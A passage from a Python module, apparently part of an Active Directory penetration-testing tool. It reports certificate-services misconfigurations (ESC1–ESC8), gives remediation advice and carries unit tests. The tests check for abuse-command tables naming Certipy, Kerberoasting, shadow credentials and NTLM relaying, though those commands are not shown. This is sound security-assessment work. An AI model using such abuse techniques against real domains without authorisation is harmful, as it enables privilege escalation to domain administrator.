            "https://attack.mitre.org/techniques/T1649/",
            "https://github.com/ly4k/Certipy",
            "https://github.com/GhostPack/Certify",
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
            f"ESC{esc_id[-1]} — https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        ]

        ev = Evidence(extra={
            "esc_chain":         esc_id,
            "template_or_ca":    template_or_ca,
            "dn":                dn,
            "trustee_sid":       extra_trustee,
            "right":             extra_right,
        })

        self.new_finding(
            title=f"ADCS {esc_id}: Vulnerable Certificate Template/CA — {template_or_ca}",
            severity=severity,
            description=(
                f"ADCS {esc_id} vulnerability detected on '{template_or_ca}' ({dn}).\n\n"
                f"{detail}\n\n"
                "Impact: An authenticated user (low-privilege) can leverage this misconfiguration "
                "to obtain a certificate for a privileged account (e.g., Domain Administrator) "
                "and authenticate as that account using Kerberos PKINIT or NTLM via pass-the-certificate."
            ),
            reproduction_steps=abuse,
            remediation=self._esc_remediation(esc_id),
            references=references,
            evidence=ev,
            cvss_v31_vector=CVSS_ADCS_ESC,
            cvss_v40_vector=CVSS40_ADCS_ESC,
            mitre_attack=["TA0006/T1649", "TA0004/T1484.001"],
            target=dc_ip,
        )

    @staticmethod
    def _esc_remediation(esc_id: str) -> str:
        remed = {
            "ESC1": (
                "Disable ENROLLEE_SUPPLIES_SUBJECT (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) on the template "
                "or enable manager approval (CT_FLAG_PEND_ALL_REQUESTS). "
                "Consider removing Client Authentication EKU if not required. "
                "Run: Certify.exe find /vulnerable"
            ),
            "ESC2": (
                "Remove the Any Purpose EKU (OID 2.5.29.37.0) from the certificate template. "
                "Restrict enrollment rights to specific security groups. "
                "Enable manager approval for sensitive templates."
            ),
            "ESC3": (
                "Restrict enrollment on Certificate Request Agent templates to specific trusted accounts. "
                "Enable manager approval. "
                "Audit which templates allow on-behalf-of enrollment."
            ),
            "ESC4": (
                "Remove unexpected WriteDACL/WriteOwner/GenericAll ACEs from certificate template objects. "
                "Restrict template modification to CA administrators only. "
                "Audit with: Get-ObjectAcl -Identity '<template CN>' -ResolveGUIDs"
            ),
            "ESC7": (
                "Audit and restrict ManageCertificates / ManageCA rights on the CA object. "
                "Only CA administrators should hold these rights. "
                "Check with: certutil -CAInfo"
            ),
            "ESC8": (
                "Disable NTLM authentication on the ADCS web enrollment endpoint, or disable "
                "web enrollment entirely if not needed. "
                "Enable EPA (Extended Protection for Authentication) on IIS. "
                "Apply MS-EFSRPC patch (KB5005413) to prevent unauthenticated PetitPotam coercion."
            ),
        }
        return remed.get(esc_id, "Review ADCS configuration per SpecterOps Certified Pre-Owned research.")


# ---------------------------------------------------------------------------
# Utility functions
# ---------------------------------------------------------------------------

def _guid_bytes_to_str(guid_bytes: bytes) -> str:
    """Convert a 16-byte binary GUID (little-endian MS format) to string form."""
    if len(guid_bytes) != 16:
        return ""
    a  = int.from_bytes(guid_bytes[0:4],  "little")
    b  = int.from_bytes(guid_bytes[4:6],  "little")
    c  = int.from_bytes(guid_bytes[6:8],  "little")
    d  = guid_bytes[8:10].hex()
    e  = guid_bytes[10:16].hex()
    return f"{a:08x}-{b:04x}-{c:04x}-{d}-{e}"


# ===========================================================================
# Tests — run with:  python -m pytest adforge/modules/acl_abuse/acl_scanner.py -q
# ===========================================================================

class TestAclScanner:
    # -----------------------------------------------------------------------
    # Constant / configuration tests
    # -----------------------------------------------------------------------
    def test_dangerous_rights_keys(self) -> None:
        """All expected right names must be present in DANGEROUS_RIGHTS."""
        for right in (
            "GenericAll", "GenericWrite", "WriteDACL", "WriteOwner",
            "AllExtendedRights", "WriteProperty", "Self",
            "WriteKeyCredentialLink", "WriteSPN",
        ):
            assert right in DANGEROUS_RIGHTS, f"Missing right: {right}"

    def test_skip_sids(self) -> None:
        assert "S-1-5-18"     in SKIP_SIDS  # SYSTEM
        assert "S-1-5-32-544" in SKIP_SIDS  # Administrators

    def test_phase(self) -> None:
        assert AclScanner.PHASE == 9

    def test_mitre_tags(self) -> None:
        tags = AclScanner.TAGS
        assert "mitre-T1484.001" in tags
        assert "mitre-T1649"     in tags
        assert "mitre-T1558.003" in tags
        assert "mitre-T1556"     in tags

    # -----------------------------------------------------------------------
    # ADCS ESC constants
    # -----------------------------------------------------------------------
    def test_ct_flag_enrollee_supplies_subject(self) -> None:
        assert CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT == 0x1

    def test_ct_flag_pend_all_requests(self) -> None:
        assert CT_FLAG_PEND_ALL_REQUESTS == 0x2

    def test_eku_any_purpose(self) -> None:
        assert EKU_ANY_PURPOSE == "2.5.29.37.0"

    def test_eku_cert_request_agent(self) -> None:
        assert EKU_CERT_REQUEST_AGENT == "1.3.6.1.4.1.311.20.2.1"

    def test_dangerous_ekus_set(self) -> None:
        assert EKU_ANY_PURPOSE        in DANGEROUS_EKUS
        assert EKU_CERT_REQUEST_AGENT in DANGEROUS_EKUS
        assert EKU_CLIENT_AUTH        in DANGEROUS_EKUS
        assert EKU_SMART_CARD_LOGON   in DANGEROUS_EKUS

    # -----------------------------------------------------------------------
    # GUID constants
    # -----------------------------------------------------------------------
    def test_guid_key_credential_link(self) -> None:
        assert GUID_KEY_CREDENTIAL_LINK == "5b47d60f-6090-40b2-9f37-2a4de88f3063"

    def test_guid_service_principal_name(self) -> None:
        assert GUID_SERVICE_PRINCIPAL_NAME == "f3a64788-5306-11d1-a9c5-0000f80367c1"

    def test_guid_replication_get_changes(self) -> None:
        assert GUID_REPLICATION_GET_CHANGES == "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"

    # -----------------------------------------------------------------------
    # Privileged groups
    # -----------------------------------------------------------------------
    def test_privileged_groups_includes_expanded_set(self) -> None:
        for group in (
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Protected Users", "Backup Operators", "Account Operators",
            "Read-only Domain Controllers",
        ):
            assert group in PRIVILEGED_GROUPS, f"Missing group: {group}"

    def test_builtin_groups(self) -> None:
        assert "Backup Operators"   in BUILTIN_GROUPS
        assert "Account Operators"  in BUILTIN_GROUPS
        # Domain Admins lives in Users, not Builtin
        assert "Domain Admins" not in BUILTIN_GROUPS

    # -----------------------------------------------------------------------
    # CVSS vectors format
    # -----------------------------------------------------------------------
    def test_cvss31_vectors_format(self) -> None:
        for vec in (CVSS_ACL, CVSS_ACL_HIGH, CVSS_ADCS_ESC, CVSS_WRITESPN, CVSS_SHADOWCRED):
            assert vec.startswith("CVSS:3.1/"), f"Bad v3.1 vector: {vec}"

    def test_cvss40_vectors_format(self) -> None:
        for vec in (CVSS40_ACL, CVSS40_ACL_HIGH, CVSS40_ADCS_ESC, CVSS40_WRITESPN, CVSS40_SHADOWCRED):
            assert vec.startswith("CVSS:4.0/"), f"Bad v4.0 vector: {vec}"

    # -----------------------------------------------------------------------
    # Abuse commands
    # -----------------------------------------------------------------------
    def test_abuse_commands_present(self) -> None:
        for right in (
            "GenericAll", "GenericWrite", "WriteDACL", "WriteOwner",
            "AllExtendedRights", "WriteKeyCredentialLink", "WriteSPN",
        ):
            assert right in ABUSE_COMMANDS, f"Missing abuse commands for: {right}"
            cmds = ABUSE_COMMANDS[right]
            assert len(cmds) >= 1, f"Empty abuse commands for: {right}"

    def test_esc_abuse_commands_present(self) -> None:
        for esc in ("ESC1", "ESC2", "ESC3", "ESC4", "ESC7", "ESC8"):
            assert esc in ESC_ABUSE_COMMANDS, f"Missing ESC abuse commands for: {esc}"
            assert len(ESC_ABUSE_COMMANDS[esc]) >= 1

    def test_writekeycredentiallink_abuse_mentions_certipy(self) -> None:
        cmds = " ".join(ABUSE_COMMANDS["WriteKeyCredentialLink"])
        assert "certipy" in cmds.lower() or "shadow" in cmds.lower()

    def test_writespn_abuse_mentions_kerberoast(self) -> None:
        cmds = " ".join(ABUSE_COMMANDS["WriteSPN"])
        assert "kerberoast" in cmds.lower() or "spn" in cmds.lower()

    def test_esc1_abuse_mentions_certipy(self) -> None:
        cmds = " ".join(ESC_ABUSE_COMMANDS["ESC1"])
        assert "certipy" in cmds.lower()

    def test_esc8_abuse_mentions_ntlmrelayx(self) -> None:
        cmds = " ".join(ESC_ABUSE_COMMANDS["ESC8"])
        assert "ntlmrelayx" in cmds.lower()

    # -----------------------------------------------------------------------
    # GUID utility function
    # -----------------------------------------------------------------------
    def test_guid_bytes_to_str_correct(self) -> None:
        # Encode GUID_KEY_CREDENTIAL_LINK in MS binary format and decode back
        # 5b47d60f-6090-40b2-9f37-2a4de88f3063
        import struct
        a  = 0x5b47d60f
        b  = 0x6090
        c  = 0x40b2
        d  = bytes.fromhex("9f37")
        e  = bytes.fromhex("2a4de88f3063")
        raw = struct.pack("<IHH", a, b, c) + d + e
        result = _guid_bytes_to_str(raw)
        assert result == GUID_KEY_CREDENTIAL_LINK

    def test_guid_bytes_to_str_wrong_length(self) -> None:
        assert _guid_bytes_to_str(b"\x00" * 5) == ""

    # -----------------------------------------------------------------------
    # ESC remediation coverage
    # -----------------------------------------------------------------------
    def test_esc_remediation_all_covered(self) -> None:
        for esc in ("ESC1", "ESC2", "ESC3", "ESC4", "ESC7", "ESC8"):
            remed = AclScanner._esc_remediation(esc)
            assert len(remed) > 20, f"Thin remediation for {esc}"

    def test_esc_remediation_unknown_returns_fallback(self) -> None:
        remed = AclScanner._esc_remediation("ESC99")
        assert "SpecterOps" in remed or len(remed) > 10

    # -----------------------------------------------------------------------
    # AclScanner class metadata
    # -----------------------------------------------------------------------
    def test_scanner_name(self) -> None:
        assert AclScanner.NAME == "acl_scanner"

    def test_scanner_description_mentions_esc(self) -> None:
        assert "ESC" in AclScanner.DESCRIPTION or "adcs" in AclScanner.DESCRIPTION.lower()

    def test_scanner_tags_include_shadow_credentials(self) -> None:
        assert "shadow-credentials" in AclScanner.TAGS

    def test_scanner_tags_include_kerberoasting(self) -> None:
        assert "kerberoasting" in AclScanner.TAGS
